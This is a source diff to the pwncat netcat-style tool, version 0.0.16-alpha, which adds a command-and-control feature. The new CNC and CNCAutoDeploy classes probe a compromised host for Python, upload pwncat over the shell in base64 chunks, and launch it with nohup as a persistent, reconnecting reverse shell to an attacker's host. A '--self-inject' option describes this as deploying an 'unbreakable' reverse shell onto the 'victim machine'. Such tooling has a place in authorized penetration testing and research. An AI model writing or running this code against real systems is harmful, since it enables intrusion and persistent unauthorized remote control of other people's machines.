@@ -3,15 +3,16 @@
 
 # Main sections in this file:
 # ------------------------------------
-# 1. Data structure types
-# 2. Library classes
-# 3. Network
-# 4. Transformer
-# 5. IO modules
-# 6. PSE Store
-# 7. IO Runner
-# 8. Command line arguments
-# 9. Main entrypoint
+#  1. Data structure types
+#  2. Library classes
+#  3. Network
+#  4. Transformer
+#  5. IO modules
+#  6. PSE Store
+#  7. IO Runner
+#  8. Command & Control
+#  9. Command line arguments
+# 10. Main entrypoint
 #
 # How does it work?
 # ------------------------------------
@@ -63,6 +64,7 @@ from subprocess import STDOUT
 
 import argparse
 import atexit
+import base64
 import logging
 import os
 import re
@@ -89,7 +91,7 @@ if os.name != "nt":
 
 APPNAME = "pwncat"
 APPREPO = "https://github.com/cytopia/pwncat"
-VERSION = "0.0.15-alpha"
+VERSION = "0.0.16-alpha"
 
 # Default timeout for timeout-based sys.stdin and socket.recv
 TIMEOUT_READ_STDIN = 0.1
@@ -114,13 +116,13 @@ LISTEN_BACKLOG = 0
 # #################################################################################################
 # #################################################################################################
 # ###
-# ###   1 / 8   D A T A   S T R U C T U R E   T Y P E S
+# ###   1 / 10   D A T A   S T R U C T U R E   T Y P E S
 # ###
 # #################################################################################################
 # #################################################################################################
 
 # -------------------------------------------------------------------------------------------------
-# [1/8 DATA STRUCTURE TYPES]: (1/9) DsRunnerAction
+# [1/10 DATA STRUCTURE TYPES]: (1/9) DsRunnerAction
 # -------------------------------------------------------------------------------------------------
 class DsRunnerAction(object):
     """A type-safe data structure for Action functions for the Runner class."""
@@ -178,7 +180,7 @@ class DsRunnerAction(object):
 
 
 # -------------------------------------------------------------------------------------------------
-# [1/8 DATA STRUCTURE TYPES]: (2/9) DsRunnerTimer
+# [1/10 DATA STRUCTURE TYPES]: (2/9) DsRunnerTimer
 # -------------------------------------------------------------------------------------------------
 class DsRunnerTimer(object):
     """A type-safe data structure for Timer functions for the Runner class."""
@@ -238,7 +240,7 @@ class DsRunnerTimer(object):
 
 
 # -------------------------------------------------------------------------------------------------
-# [1/8 DATA STRUCTURE TYPES]: (3/9) DsSock
+# [1/10 DATA STRUCTURE TYPES]: (3/9) DsSock
 # -------------------------------------------------------------------------------------------------
 class DsSock(object):
     """A type-safe data structure for DsSock options."""
@@ -294,7 +296,7 @@ class DsSock(object):
 
 
 # -------------------------------------------------------------------------------------------------
-# [1/8 DATA STRUCTURE TYPES]: (4/9) DsIONetworkSock
+# [1/10 DATA STRUCTURE TYPES]: (4/9) DsIONetworkSock
 # -------------------------------------------------------------------------------------------------
 class DsIONetworkSock(DsSock):
     """A type-safe data structure for IONetwork socket options."""
@@ -319,7 +321,7 @@ class DsIONetworkSock(DsSock):
 
 
 # -------------------------------------------------------------------------------------------------
-# [1/8 DATA STRUCTURE TYPES]: (5/9) DsIONetworkCli
+# [1/10 DATA STRUCTURE TYPES]: (5/9) DsIONetworkCli
 # -------------------------------------------------------------------------------------------------
 class DsIONetworkCli(object):
     """A type-safe data structure for IONetwork client options."""
@@ -373,7 +375,7 @@ class DsIONetworkCli(object):
 
 
 # -------------------------------------------------------------------------------------------------
-# [1/8 DATA STRUCTURE TYPES]: (6/9) DsIONetworkSrv
+# [1/10 DATA STRUCTURE TYPES]: (6/9) DsIONetworkSrv
 # -------------------------------------------------------------------------------------------------
 class DsIONetworkSrv(object):
     """A type-safe data structure for IONetwork server options."""
@@ -430,7 +432,7 @@ class DsIONetworkSrv(object):
 
 
 # -------------------------------------------------------------------------------------------------
-# [1/8 DATA STRUCTURE TYPES]: (7/9) DsTransformLinefeed
+# [1/10 DATA STRUCTURE TYPES]: (7/9) DsTransformLinefeed
 # -------------------------------------------------------------------------------------------------
 class DsTransformLinefeed(object):
     """A type-safe data structure for DsTransformLinefeed options."""
@@ -454,7 +456,7 @@ class DsTransformLinefeed(object):
 
 
 # -------------------------------------------------------------------------------------------------
-# [1/8 DATA STRUCTURE TYPES]: (8/9) DsIOStdinStdout
+# [1/10 DATA STRUCTURE TYPES]: (8/9) DsIOStdinStdout
 # -------------------------------------------------------------------------------------------------
 class DsIOStdinStdout(object):
     """A type-safe data structure for IOStdinStdout options."""
@@ -485,7 +487,7 @@ class DsIOStdinStdout(object):
 
 
 # -------------------------------------------------------------------------------------------------
-# [1/8 DATA STRUCTURE TYPES]: (9/9) DsIOCommand
+# [1/10 DATA STRUCTURE TYPES]: (9/9) DsIOCommand
 # -------------------------------------------------------------------------------------------------
 class DsIOCommand(object):
     """A type-safe data structure for IOCommand options."""
@@ -531,13 +533,13 @@ class DsIOCommand(object):
 # #################################################################################################
 # #################################################################################################
 # ###
-# ###   2 / 8   L I B R A R Y   C L A S S E S
+# ###   2 / 10   L I B R A R Y   C L A S S E S
 # ###
 # #################################################################################################
 # #################################################################################################
 
 # -------------------------------------------------------------------------------------------------
-# [2/8 LIBRARY CLASSES]: (1/4) TraceLogger
+# [2/10 LIBRARY CLASSES]: (1/4) TraceLogger
 # -------------------------------------------------------------------------------------------------
 class TraceLogger(logging.getLoggerClass()):  # type: ignore
     """Extend Python's default logger class with TRACE level logging."""
@@ -577,7 +579,7 @@ class TraceLogger(logging.getLoggerClass()):  # type: ignore
 
 
 # -------------------------------------------------------------------------------------------------
-# [2/8 LIBRARY CLASSES]: (2/4) ColoredLogFormatter
+# [2/10 LIBRARY CLASSES]: (2/4) ColoredLogFormatter
 # -------------------------------------------------------------------------------------------------
 class ColoredLogFormatter(logging.Formatter):
     """Custom log formatter which adds different details and color support."""
@@ -650,7 +652,7 @@ class ColoredLogFormatter(logging.Formatter):
 
 
 # -------------------------------------------------------------------------------------------------
-# [2/8 LIBRARY CLASSES]: (3/4) StringEncoder
+# [2/10 LIBRARY CLASSES]: (3/4) StringEncoder
 # -------------------------------------------------------------------------------------------------
 class StringEncoder(object):
     """Takes care about Python 2/3 string encoding/decoding.
@@ -692,9 +694,14 @@ class StringEncoder(object):
             return data.decode(self.__codec)
         return data  # type: ignore
 
+    def base64_encode(self, data):
+        # type: (str) -> str
+        """Convert string into a base64 encoded string."""
+        return self.decode(base64.b64encode(self.encode(data)))
+
 
 # -------------------------------------------------------------------------------------------------
-# [2/8 LIBRARY CLASSES]: (4/4): StopSignal
+# [2/10 LIBRARY CLASSES]: (4/4): StopSignal
 # -------------------------------------------------------------------------------------------------
 class StopSignal(object):
     """Provide a simple boolean switch."""
@@ -724,13 +731,13 @@ class StopSignal(object):
 # #################################################################################################
 # #################################################################################################
 # ###
-# ###   3 / 8   N E T W O R K
+# ###   3 / 10   N E T W O R K
 # ###
 # #################################################################################################
 # #################################################################################################
 
 # -------------------------------------------------------------------------------------------------
-# [3/8 NETWORK]: (1/1) Sock
+# [3/10 NETWORK]: (1/1) Sock
 # -------------------------------------------------------------------------------------------------
 class Sock(object):
     """Provides an abstracted server client socket for TCP and UDP."""
@@ -1222,13 +1229,13 @@ class Sock(object):
 # #################################################################################################
 # #################################################################################################
 # ###
-# ###   4 / 8   T R A N S F O R M E R
+# ###   4 / 10   T R A N S F O R M E R
 # ###
 # #################################################################################################
 # #################################################################################################
 
 # -------------------------------------------------------------------------------------------------
-# [4/8 TRANSFORM]: (1/2): Transform
+# [4/10 TRANSFORM]: (1/2): Transform
 # -------------------------------------------------------------------------------------------------
 class Transform(ABC):  # type: ignore
     """Abstract class to for pwncat I/O transformers.
@@ -1269,7 +1276,7 @@ class Transform(ABC):  # type: ignore
 
 
 # -------------------------------------------------------------------------------------------------
-# [4/8 TRANSFORM]: (2/2) TransformLinefeed
+# [4/10 TRANSFORM]: (2/2) TransformLinefeed
 # -------------------------------------------------------------------------------------------------
 class TransformLinefeed(Transform):
     """Implement basic linefeed replacement."""
@@ -1345,13 +1352,13 @@ class TransformLinefeed(Transform):
 # #################################################################################################
 # #################################################################################################
 # ###
-# ###   5 / 8   I O   M O D U L E S
+# ###   5 / 10   I O   M O D U L E S
 # ###
 # #################################################################################################
 # #################################################################################################
 
 # -------------------------------------------------------------------------------------------------
-# [5/8 IO]: (1/4): IO
+# [5/10 IO]: (1/4): IO
 # -------------------------------------------------------------------------------------------------
 class IO(ABC):  # type: ignore
     """Abstract class to for pwncat I/O modules.
@@ -1437,7 +1444,7 @@ class IO(ABC):  # type: ignore
 
 
 # -------------------------------------------------------------------------------------------------
-# [5/8 IONetwork]: (2/4) IONetwork
+# [5/10 IONetwork]: (2/4) IONetwork
 # -------------------------------------------------------------------------------------------------
 class IONetwork(IO):
     """Pwncat implementation based on custom Socket library."""
@@ -1661,7 +1668,7 @@ class IONetwork(IO):
 
 
 # -------------------------------------------------------------------------------------------------
-# [5/8 IOStdinStdout]: (3/4) IOStdinStdout
+# [5/10 IOStdinStdout]: (3/4) IOStdinStdout
 # -------------------------------------------------------------------------------------------------
 class IOStdinStdout(IO):
     """Implement basic stdin/stdout I/O module.
@@ -1765,7 +1772,7 @@ class IOStdinStdout(IO):
 
 
 # -------------------------------------------------------------------------------------------------
-# [5/8 IOCommand]: (4/4) IOCommand
+# [5/10 IOCommand]: (4/4) IOCommand
 # -------------------------------------------------------------------------------------------------
 class IOCommand(IO):
     """Implement command execution functionality.
@@ -1871,7 +1878,7 @@ class IOCommand(IO):
 # #################################################################################################
 # #################################################################################################
 # ###
-# ###   6 / 9   P S E   S T O R E
+# ###   6 / 10   P S E   S T O R E
 # ###
 # #################################################################################################
 # #################################################################################################
@@ -1946,13 +1953,13 @@ class PSEStore(object):
 # #################################################################################################
 # #################################################################################################
 # ###
-# ###   7 / 9   R U N N E R
+# ###   7 / 10   R U N N E R
 # ###
 # #################################################################################################
 # #################################################################################################
 
 # -------------------------------------------------------------------------------------------------
-# [7/9 IO RUNNER]: (1/1) Runner
+# [7/10 IO RUNNER]: (1/1) Runner
 # -------------------------------------------------------------------------------------------------
 class Runner(object):
     """Runner class that takes care about putting everything into threads."""
@@ -2170,13 +2177,340 @@ class Runner(object):
 # #################################################################################################
 # #################################################################################################
 # ###
-# ###   8 / 9   C O M M A N D   L I N E   A R G U M E N T S
+# ###   8 / 10   C O M M A N D   A N D   C O N T R O L   M O D U L E S
 # ###
 # #################################################################################################
 # #################################################################################################
 
 # -------------------------------------------------------------------------------------------------
-# [8/9 COMMAND LINE ARGUMENTS]: (1/2) Helper Functions
+# [8/10 Command & Control]: (1/2) CNC
+# -------------------------------------------------------------------------------------------------
+class CNC(object):
+    """Command and Control base class."""
+
+    __PYTHON_PATHS = [
+        "/bin",
+        "/usr/bin",
+        "/usr/local/bin",
+        "/usr/local/python/bin",
+        "/usr/local/python2/bin",
+        "/usr/local/python2.7/bin",
+        "/usr/local/python3/bin",
+        "/usr/local/python3.5/bin",
+        "/usr/local/python3.6/bin",
+        "/usr/local/python3.7/bin",
+        "/usr/local/python3.8/bin",
+        "/opt/bin",
+        "/opt/python/bin",
+        "/opt/python2/bin",
+        "/opt/python2.7/bin",
+        "/opt/python3/bin",
+        "/opt/python3.5/bin",
+        "/opt/python3.6/bin",
+        "/opt/python3.7/bin",
+        "/opt/python3.8/bin",
+    ]
+
+    __PYTHON_VERSIONS = [
+        "python",
+        "python2",
+        "python2.7",
+        "python3",
+        "python3.5",
+        "python3.6",
+        "python3.7",
+        "python3.8",
+    ]
+
+    __COLORS = {"yellow": "\x1b[33;21m", "reset": "\x1b[0m"}
+
+    # --------------------------------------------------------------------------
+    # Properties
+    # --------------------------------------------------------------------------
+    @property
+    def python(self):
+        # type: () -> str
+        """Discovered absolute Python remote path."""
+        return self.__python
+
+    @property
+    def py3(self):
+        # type: () -> bool
+        """Is remote version Python3? Else it is Python2."""
+        return self.__py3
+
+    # --------------------------------------------------------------------------
+    # Constructor
+    # --------------------------------------------------------------------------
+    def __init__(self, enc, fsend, frecv):
+        # type: (StringEncoder, Callable[[str], None], Callable[[], Iterator[str]]) -> None
+        """Instantiate Command and Control class.
+
+        Args:
+            enc (StringEncoder): Instance of StringEncoder (Python2/3 str/byte compat).
+            fsend (func): Socket send function.
+            frcev (func): Socket receive generator function.
+
+        Raises:
+            FileNotFoundError: if remote Python binary path is not found.
+        """
+        self.__enc = enc
+        self.__fsend = fsend
+        self.__frecv = frecv
+
+        if not self.__set_remote_python_path():
+            self.print_info("No Python has been found. Aborting and handing over to current shell.")
+            raise FileNotFoundError()
+
+    # --------------------------------------------------------------------------
+    # Public Functions
+    # --------------------------------------------------------------------------
+    def print_info(self, message=None, newline=True, erase=False):
+        # type: (Optional[str], bool, bool) -> None
+        """Print a message to the local screen to inform the user.
+
+        Args:
+            message (str): The message to print.
+            newline (bool): Add a newline?
+            erase (bool): Erase previously printed text on the same line.
+        """
+        end = "\n" if newline else ""
+        prefix = "{}[PWNCAT CnC]{} ".format(self.__COLORS["yellow"], self.__COLORS["reset"])
+        if message is None:
+            message = ""
+            prefix = ""
+
+        if erase:
+            print("\r" * 1024 + "{}{}".format(prefix, message), end=end)
+            sys.stdout.flush()
+        else:
+            print("{}{}".format(prefix, message), end=end)
+            sys.stdout.flush()
+
+    def remote_command(self, command):
+        # type: (str) -> None
+        """Run remote command with correct linefeeds.
+
+        Args:
+            command (str): The command to execute on the remote end.
+        """
+        # TODO: determine remote host line feeds and set accordingly.
+        self.__fsend(command + "\n")
+
+    def create_remote_tmpfile(self):
+        # type: () -> Optional[str]
+        """OS-independent remote tempfile creation.
+
+        Returns:
+            str or None: Returns path on success or None on error.
+        """
+        command = []
+        command.append("{} -c '".format(self.__python))
+        command.append("import tempfile;")
+        command.append("h,f=tempfile.mkstemp();")
+        if self.__py3:
+            command.append("print(f);")
+        else:
+            command.append("print f;")
+        command.append("'")
+        self.remote_command("".join(command))
+
+        self.print_info("Creating tmpfile:", False, True)
+        for response in self.__frecv():
+            if response:
+                tmpfile = response.rstrip()
+                self.print_info("Creating tmpfile: {}".format(tmpfile), True, True)
+                return tmpfile
+
+        self.print_info("Failed to create tmpfile", True, True)
+        return None
+
+    def upload(self, lpath, rpath):
+        # type: (str, str) -> bool
+        """OS-independent upload of a local file to a remote path.
+
+        Args:
+            lpath (str): Local path of the file.
+            rpath (str): Remote path, where to upload the base64 encoded file.
+
+        Returns:
+            bool: Returns `True` on success and `False` on failure.
+        """
+        assert self.__python is not None
+        assert self.__py3 is not None
+
+        rpath_b64 = self.create_remote_tmpfile()
+        if rpath_b64 is None:
+            return False
+        if not self.__upload_file_base_64_encoded(lpath, rpath_b64):
+            return False
+        if not self.__remote_base64_decode(rpath_b64, rpath):
+            return False
+        return True
+
+    # --------------------------------------------------------------------------
+    # Private Functions
+    # --------------------------------------------------------------------------
+    def __set_remote_python_path(self):
+        # type: () -> bool
+        """Enumerate remote Python binary.
+
+        Returns:
+            bool: Returns `True` on success and `False` on failure.
+        """
+        # TODO: Make windows compatible
+        for path in self.__PYTHON_PATHS:
+            for version in self.__PYTHON_VERSIONS:
+                python = path + "/" + version
+                self.print_info("Probing for: {}".format(python))
+                self.remote_command("test -f {p} && echo {p} || echo;".format(p=python))
+                for response in self.__frecv():
+                    reg = re.search(r"^([.0-9]+)", response)
+                    if response.rstrip() == python.rstrip():
+                        self.print_info("Potential path: {}".format(python))
+                        command = []
+                        command.append("{} -c '".format(python))
+                        command.append("from __future__ import print_function;")
+                        command.append("import sys;")
+                        command.append("v=sys.version_info;")
+                        command.append('print("{}.{}.{}".format(v[0], v[1], v[2]));\'')
+                        data = "".join(command)
+                        self.remote_command(data)
+                        continue
+                    if reg:
+                        match = reg.group(1)
+                        if match[0] == "2":
+                            self.__py3 = False
+                        elif match[0] == "3":
+                            self.__py3 = True
+                        else:
+                            self.print_info(
+                                "Could not determine major version: {}".format(reg.group(1))
+                            )
+                            return False
+                        self.print_info("Found valid Python{} version: {}".format(match[0], match))
+                        self.__python = python
+                        return True
+                    # Nothing matched, break the innter loop
+                    break
+        return False
+
+    def __upload_file_base_64_encoded(self, lpath, rpath):
+        # type: (str, str) -> bool
+        """Upload a local file to a base64 encoded remote file.
+
+        Args:
+            lpath (str): Local path of the file.
+            rpath (str): Remote path, where to upload the base64 encoded file.
+
+        Returns:
+            bool: Returns `True` on success and `False` on failure.
+        """
+        first = True
+        with open(lpath, "r") as fhandle:
+            lines = fhandle.readlines()
+            count = len(lines)
+            curr = 1
+            for line in lines:
+                self.print_info(
+                    "Uploading: {} -> {} ({}/{})".format(lpath, rpath, curr, count), False, True
+                )
+                b64 = self.__enc.base64_encode(line)
+                if first:
+                    self.remote_command('echo "{}" > {}'.format(b64, rpath))
+                    first = False
+                else:
+                    self.remote_command('echo "{}" >> {}'.format(b64, rpath))
+                curr += 1
+        self.print_info()
+        # TODO: md5 check if this is legit
+        return True
+
+    def __remote_base64_decode(self, rpath_source, rpath_target):
+        # type: (str, str) -> bool
+        """Decode a remote base64 encoded file with pure Python.
+
+        Args:
+            rpath_source (str): The remote path to the existing base64 encoded file.
+            rpath_target (str): The remote path to the desired base64 decoded file.
+
+        Returns:
+            bool: Returns `True` on success or `False` on failure.
+        """
+        command = []
+        command.append("{} -c 'import base64;".format(self.__python))
+        command.append('f=open("{}", "r");'.format(rpath_source))
+        command.append("lines = f.readlines();")
+        if self.__py3:
+            command.append('print("".join([base64.b64decode(l.encode()) for l in lines]));\'')
+        else:
+            command.append('print "".join([base64.b64decode(l) for l in lines]);\'')
+        command.append("> {}".format(rpath_target))
+
+        self.print_info("Decoding: {} -> {}".format(rpath_source, rpath_target))
+        self.remote_command("".join(command))
+        # TODO: validate via md5
+        return True
+
+
+# -------------------------------------------------------------------------------------------------
+# [8/10 Command & Control]: (1/2) CNCAutoDeploy
+# -------------------------------------------------------------------------------------------------
+class CNCAutoDeploy(CNC):
+    """Command&Control pwncat auto deployment class."""
+
+    def __init__(
+        self,
+        enc,  # type: StringEncoder
+        send,  # type: Callable[[str], None]
+        recv,  # type: Callable[[], Iterator[str]]
+        cmd,  # type: str
+        host,  # type: str
+        port,  # type: str
+    ):
+        # type: (...) -> None
+        try:
+            super(CNCAutoDeploy, self).__init__(enc, send, recv)
+        except FileNotFoundError:
+            return
+
+        local_path = os.path.abspath(__file__)
+        remote_path = self.create_remote_tmpfile()
+        if remote_path is None:
+            return
+        if not self.upload(local_path, remote_path):
+            return
+        # TODO: Ensure pwncat stays running
+        self.__start_pwncat(remote_path, cmd, host, port)
+        return
+
+    def __start_pwncat(self, remote_path, binary, host, port):
+        # type: (str, str, str, str) -> None
+        command = []
+        command.append("nohup")
+        command.append(self.python)
+        command.append(remote_path)
+        command.append("--exec {}".format(binary))
+        command.append("--reconn -1")
+        command.append("--reconn-wait 1")
+        command.append(host)
+        command.append(port)
+        command.append("&")
+        data = " ".join(command)
+        print("Starting pwncat rev shell: {}".format(data))
+        self.remote_command(data)
+
+
+# #################################################################################################
+# #################################################################################################
+# ###
+# ###   9 / 10   C O M M A N D   L I N E   A R G U M E N T S
+# ###
+# #################################################################################################
+# #################################################################################################
+
+# -------------------------------------------------------------------------------------------------
+# [9/10 COMMAND LINE ARGUMENTS]: (1/2) Helper Functions
 # -------------------------------------------------------------------------------------------------
 def get_version():
     # type: () -> str
@@ -2200,6 +2534,15 @@ def _args_check_color(value):
     # type: (str) -> str
     if value not in ["auto", "always", "never"]:
         raise argparse.ArgumentTypeError("%s is an invalid color definition" % value)
+    return value
+
+
+def _args_check_upload_myself(value):
+    # type: (str) -> str
+    opts = value.split(":")
+    if len(opts) != 3:
+        raise argparse.ArgumentTypeError("%s is an invalid cmd[:host]:port definition" % value)
+    _args_check_port(opts[-1])
     return value
 
 
@@ -2389,7 +2732,7 @@ def _args_check_mutually_exclusive(parser, args):
 
 
 # -------------------------------------------------------------------------------------------------
-# [8/9 COMMAND LINE ARGUMENTS]: (2/2) Argument Parser
+# [9/10 COMMAND LINE ARGUMENTS]: (2/2) Argument Parser
 # -------------------------------------------------------------------------------------------------
 def get_args():
     # type: () -> argparse.Namespace
@@ -2420,6 +2763,7 @@ reconnect.""",
     positional = parser.add_argument_group("positional arguments")
     mode = parser.add_argument_group("mode arguments")
     optional = parser.add_argument_group("optional arguments")
+    cnc = parser.add_argument_group("command & control arguments")
     advanced = parser.add_argument_group("advanced arguments")
     misc = parser.add_argument_group("misc arguments")
 
@@ -2547,6 +2891,24 @@ color on Windows by default. (default: auto)
 """,
     )
 
+    cnc.add_argument(
+        "--self-inject",
+        metavar="cmd:host:port",
+        type=_args_check_upload_myself,
+        default=None,
+        help="""Listen mode (TCP only):
+If you are about to inject a reverse shell onto the
+victim machine (via php, bash, nc, ncat or similar),
+start your listening server with this argument.
+This will then (as soon as the reverse shell connects)
+automatically deploy and background-run an unbreakable
+pwncat reverse shell onto the victim machine which then
+also connects back to you with specified arguments.
+Example: '--self-inject /bin/bash:10.0.0.1:4444'
+Note: this is currently an experimental feature and does
+not work on Windows remote hosts yet.
+""",
+    )
     advanced.add_argument(
         "--script-send",
         metavar="file",
@@ -2835,7 +3197,7 @@ accidentally by other input.
 # #################################################################################################
 # #################################################################################################
 # ###
-# ###   9 / 9   M A I N   E N T R Y P O I N T
+# ###   10 / 10   M A I N   E N T R Y P O I N T
 # ###
 # #################################################################################################
 # #################################################################################################
@@ -2986,6 +3348,11 @@ def main():
     # Run server
     if args.listen:
         net = IONetwork(ssig, enc, host, ports, "server", srv_opts, cli_opts, sock_opts)
+        # Run blocking auto-deploy.
+        # This will hand over to normal listening server on success or failure
+        if args.self_inject:
+            cnc_cmd, cnc_host, cnc_port = args.self_inject.split(":")
+            CNCAutoDeploy(enc, net.consumer, net.producer, cnc_cmd, cnc_host, cnc_port)
         run = Runner(PSEStore(ssig, [net]))
         run.add_action(
             "RECV",
